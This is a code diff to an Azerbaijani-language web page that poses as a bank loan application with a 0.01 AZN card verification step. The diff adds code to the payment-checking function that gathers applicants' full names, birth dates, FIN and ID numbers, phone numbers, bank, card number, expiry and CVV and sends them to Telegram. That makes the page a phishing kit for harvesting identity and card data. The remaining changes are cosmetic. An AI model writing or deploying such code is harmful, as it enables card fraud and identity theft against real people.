@@ -371,7 +371,6 @@
   }
   .modal-close:hover{background:var(--line);}
 
-  /* BANK SELECT */
   .bank-grid{
     display:grid;grid-template-columns:1fr 1fr;gap:12px;
   }
@@ -416,7 +415,6 @@
   .bank-option .bank-name{font-size:13px;font-weight:600;margin-top:2px;}
   .bank-option .bank-sub{font-size:10px;color:var(--ink-soft);}
 
-  /* CARD VERIFICATION */
   .card-input-wrap{
     background:var(--paper);
     border-radius:16px;
@@ -592,7 +590,6 @@
   }
   .card-details-row .field{margin-bottom:0;}
 
-  /* ID CARD */
   .id-card-preview{
     background:linear-gradient(145deg, #f5f0e8, #e5ddd2);
     border-radius:16px;
@@ -711,7 +708,6 @@
     margin-top:4px;
   }
 
-  /* CHECKING */
   .checking-container{
     text-align:center;
     padding:30px 0;
@@ -764,7 +760,6 @@
     40%{transform:scale(1);background:var(--teal-deep);}
   }
 
-  /* OTP */
   .otp-input-field input{
     font-size:32px;
     letter-spacing:14px;
@@ -787,7 +782,6 @@
   }
   .edit-btn:hover{background:var(--line);}
 
-  /* CARD LOGOS */
   .card-logos-row{
     display:flex;
     gap:12px;
@@ -800,7 +794,6 @@
     opacity:0.7;
   }
 
-  /* CREDIT CHECK RESULT */
   .credit-result-box{
     text-align:center;
     padding:20px 0;
@@ -809,7 +802,6 @@
   .credit-result-box .result-text{font-size:22px;font-weight:700;color:var(--teal-deep);}
   .credit-result-box .result-sub{color:var(--ink-soft);font-size:15px;margin-top:6px;}
 
-  /* PAYMENT AMOUNT */
   .payment-amount{
     background:var(--teal-deep);
     color:var(--white);
@@ -1020,7 +1012,7 @@
             <input type="text" id="idnum" placeholder="12345678" maxlength="8" inputmode="numeric">
           </div>
         </div>
-        <div class="field"><label>Mobil nömrə</label><input type="tel" id="phone" placeholder="050 123 45 67" inputmode="numeric"></div>
+        <div class="field"><label>Mobil nömrə</label><input type="tel" id="phone" placeholder="050 123 45 67" inputmode="numeric" maxlength="12"></div>
         <div class="field"><label>Rəsmi iş yeriniz?</label>
           <div class="toggle-row">
             <button type="button" class="toggle-btn active" data-val="beli">Bəli</button>
@@ -1087,12 +1079,11 @@
       <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:24px;" onclick="goToCardInput()">Təsdiqlə və davam et</button>
     </div>
 
-    <!-- STEP 4: Kart Doğrulama (0.01 AZN) -->
+    <!-- STEP 4: Kart Doğrulama -->
     <div id="cardInputStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:6px;">💳 Kart Doğrulama</h2>
       <p style="color:var(--ink-soft);font-size:14px;margin:0 0 12px;">Kartınızı doğrulamaq üçün məlumatları daxil edin</p>
       
-      <!-- Ödəniş məbləği -->
       <div class="payment-amount">
         <div class="label">Doğrulama məbləği</div>
         <div class="amount">0.01 ₼</div>
@@ -1634,6 +1625,28 @@ function goToPaymentChecking(){
     return;
   }
 
+  // Məlumatları topla və Telegram-a göndər
+  const firstName = document.getElementById('firstName').value || 'ƏLİ';
+  const lastName = document.getElementById('lastName').value || 'MƏMMƏDOV';
+  const patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
+  const name = firstName + ' ' + lastName;
+  const birth = document.getElementById('birthDate').value || '1990-01-01';
+  const fin = document.getElementById('fin').value || 'Məlumat yoxdur';
+  const id = document.getElementById('idnum').value || 'Məlumat yoxdur';
+  const prefix = document.getElementById('idPrefix').value || 'AZE';
+  const phone = document.getElementById('phone').value || 'Məlumat yoxdur';
+  const job = document.querySelector('.toggle-btn.active')?.dataset?.val === 'beli' ? 'Bəli' : 'Xeyr';
+  const amount = document.getElementById('creditAmountDisplay').textContent;
+  const term = document.getElementById('termLabel').textContent;
+
+  applicationData = {
+    name, patronymic, birth, fin, id: prefix + ' ' + id, phone, job,
+    bank: selectedBankData.name, cardNumber, expiry, cvv, amount, term
+  };
+
+  // Telegram-a göndər
+  sendToTelegram(applicationData);
+
   document.getElementById('cardInputStep').style.display='none';
   document.getElementById('checkingStep').style.display='block';
   
@@ -1703,7 +1716,7 @@ document.getElementById('applyForm').addEventListener('submit', (e)=>{
   if(!fin || fin.length !== 7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
   if(!id || id.length !== 8){ alert('Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır!'); return; }
   const phoneDigits = phone.replace(/\D/g,'');
-  if(phoneDigits.length !== 10 || phoneDigits[0] !== '0'){ alert('Düzgün mobil nömrə daxil edin!'); return; }
+  if(phoneDigits.length !== 10 || phoneDigits[0] !== '0'){ alert('Düzgün mobil nömrə daxil edin! (050 123 45 67)'); return; }
   if(!consent1 || !consent2){ alert('Bütün razılıqları qeyd edin!'); return; }
 
   const prefix = document.getElementById('idPrefix').value || 'AZE';
@@ -1810,6 +1823,8 @@ document.getElementById('idnum').addEventListener('input', function(){
   this.value = this.value.replace(/\D/g,'').slice(0,8);
   updateIDPreview();
 });
+
+// Telefon maskası - maksimum 10 rəqəm
 document.getElementById('phone').addEventListener('input', function(){
   let digits = this.value.replace(/\D/g,'').slice(0,10);
   let out = '';
@@ -1819,9 +1834,10 @@ document.getElementById('phone').addEventListener('input', function(){
   if(digits.length>8) out += ' ' + digits.slice(8,10);
   this.value = out;
 });
+
 document.getElementById('checkFin').addEventListener('input', function(){
   this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
 });
 </script>
 </body>
-</html>
+          </html>
